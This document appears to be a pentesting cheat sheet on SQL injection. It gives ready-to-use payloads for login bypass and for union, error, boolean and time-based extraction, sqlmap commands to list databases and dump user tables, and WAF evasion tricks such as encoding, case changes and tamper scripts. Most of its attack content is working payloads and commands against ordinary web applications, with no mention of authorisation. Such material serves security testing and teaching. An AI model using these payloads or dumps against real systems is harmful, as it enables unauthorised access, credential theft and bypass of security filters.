# 💉 SQL Injection (SQLi)

---

## 📖 Description

SQL Injection is a vulnerability that occurs when a web application includes user-controlled data directly inside a SQL query, without properly sanitizing or validating it. This allows an attacker to **break the query's logic** and inject arbitrary SQL code.

The impact can be critical: unauthorized access to sensitive data, authentication bypass, full database extraction, and even OS command execution if the database user has sufficient privileges.

A vulnerable query looks like this internally:

```sql
SELECT * FROM products WHERE id = '$input'
-- If input = 1' OR '1'='1, the query becomes:
SELECT * FROM products WHERE id = '1' OR '1'='1'
-- → returns ALL records
```

---

## 🔎 Detection

### Where to look

The first step is identifying all data entry points in the application. Always test the most common ones:

- **GET parameters** → `?q=`, `?search=`, `?name=`, `?msg=`, `?input=`
- **Form fields** → comments, search, registration, profile

Less likely, but also worth checking:

- **HTTP headers** → `User-Agent`, `Referer`, `X-Forwarded-For`
- **Cookies** → any cookie whose value is reflected in the page

### Test characters

Once a parameter is identified, inject characters that **break SQL syntax** and observe whether the application reacts differently (error, blank page, changed behavior). The goal is to confirm that the input reaches the query unescaped.

```
'
''
`
"
```

> 🚨 **Important**: Always test with the three comment variants, since the correct delimiter depends on the DBMS and how the query is written:
>
> ```
> 'payload-- -
> 'payload--
> 'payload#
> ```

### Identifying the SQLi type

Once the parameter is confirmed as injectable, the next question is **how the application returns information**, as this determines the attack type:

```
Is there a visible SQL error on the page?              → ERROR-BASED
Does the page reflect DBMS data in the HTML?           → UNION-BASED
Does the page change based on a TRUE/FALSE condition?  → BOOLEAN-BASED
No visible change, but a delay with SLEEP()?           → TIME-BASED
```

### 🤖 Quick test with sqlmap

Before going manual, always run sqlmap first. If it finds something, it saves all the work:

```bash
# GET parameters
sqlmap -u "http://domain.com/page.php?id=1" --batch --dbs

# POST parameters (save the request from Burp as req.txt)
sqlmap -r req.txt --batch --dbs

# If the first attempt finds nothing, increase aggressiveness
sqlmap -r req.txt --batch -p id --level=3 --risk=2 --dbs
sqlmap -r req.txt --batch --dbms=mysql --dbs
```

If injection is found, follow the standard flow:

```bash
sqlmap -r req.txt --batch --dbs                          # 1. List databases
sqlmap -r req.txt --batch -D db_name --tables            # 2. List tables
sqlmap -r req.txt --batch -D db_name -T users --dump     # 3. Dump table
```

---

## 🔐 Special case: Login Form

Login forms are a prime target because a SQLi here can mean **complete authentication bypass**, with no valid credentials needed.

First, look for unusual behavior using the basic characters (`'`, `''`, `` ` ``, `"`). If there's a reaction, try the classic payloads:

```sql
-- Single quote
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
admin'#
admin' OR '1'='1
admin' OR 1=1--

-- Double quote
" OR "1"="1
" OR 1=1--
" OR 1=1#
```

> If the login is vulnerable but payloads don't grant direct access, use sqlmap to dump the users table and log in with the real credentials.

---

## 📑 Types & Exploitation

#### 1️⃣ Union-Based

The original query returns data that **is displayed on the page**. We leverage the `UNION` operator to append a second query that extracts the data we want, which will appear mixed into the normal response.

**Requirement**: our injected query must have the **same number of columns** as the original, with compatible data types.

##### 🕵️‍♂️ Detection: number of columns

```sql
-- Option 1: ORDER BY (increment until error → columns = previous number)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

-- Option 2: UNION SELECT NULL (add NULLs until no error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

##### 💥 Exploitation

```sql
-- 1. Find which columns accept strings
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
-- If 'a' appears in the response → that column accepts text

-- 2. Identify the DBMS
' UNION SELECT @@version,NULL--    -- MySQL / MSSQL
' UNION SELECT version(),NULL--    -- PostgreSQL

-- 3. Enumerate tables and columns
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- 4. Extract data
' UNION SELECT username,password FROM users--
```

> 🚨 The number of columns in the injected SELECT must always match the original query. E.g. with 2 columns: `' UNION SELECT table_name, NULL FROM information_schema.tables#`

---

#### 2️⃣ Error-Based

The application **displays SQL errors on the page**. We deliberately force errors (e.g. a type casting error) so that the error message includes the value we want to extract.

##### 🕵️‍♂️ Detection

Any character that breaks the syntax (`'`, `"`, `` ` ``) and triggers a visible error message on screen.

##### 💥 Exploitation

```sql
-- Force a casting error: the extracted value appears in the error message
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
' AND CAST((SELECT username FROM users LIMIT 1) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--

-- Success → message like:
-- ERROR: invalid input syntax for type integer: "extracted_value"
```

---

#### 3️⃣ Boolean-Based (Blind)

No visible errors or reflected data, but **the page changes based on whether the condition is true or false** (different content, shorter response, different status code). This difference is used as an oracle to extract data character by character.

##### 🕵️‍♂️ Detection

```sql
' AND 1=1--   -- normal response (TRUE)
' AND 1=2--   -- different response (FALSE)

' AND 1=1#
' AND 1=2#
```

If both responses differ from each other, the parameter is injectable and boolean differentiation is possible.

---

#### 4️⃣ Time-Based (Blind)

No visual change in the response at all. The only way to infer whether a condition is true or false is **by measuring the response time**: if the condition is true, the server delays X seconds; if false, it responds immediately.

##### 🕵️‍♂️ Detection

```sql
-- MySQL
' AND SLEEP(5)--
' OR SLEEP(5)--

-- PostgreSQL
' AND pg_sleep(5)--
' OR pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
```

If the response takes ~5 seconds, the parameter is injectable.

---

## ✋🏻 Bypasses

When filters or WAFs block direct payloads, these techniques can be used to evade detection:

| Technique | Example |
|---|---|
| **URL encoding** | `'` → `%27` |
| **Double encoding** | `'` → `%2527` |
| **Keyword obfuscation** | `UNION` → `UnIoN`, `uNiOn` |
| **Inline comments** | `UNION SELECT` → `UN/**/ION SEL/**/ECT` |
| **Close with `#`** instead of `--` | `admin'#` |
| **WAF bypass with sqlmap** | `--tamper=space2comment --level=5 --risk=3` |

> 🚨 If the endpoint has a **CSRF token**, every request needs a fresh token. Use `--csrf-token` with sqlmap.
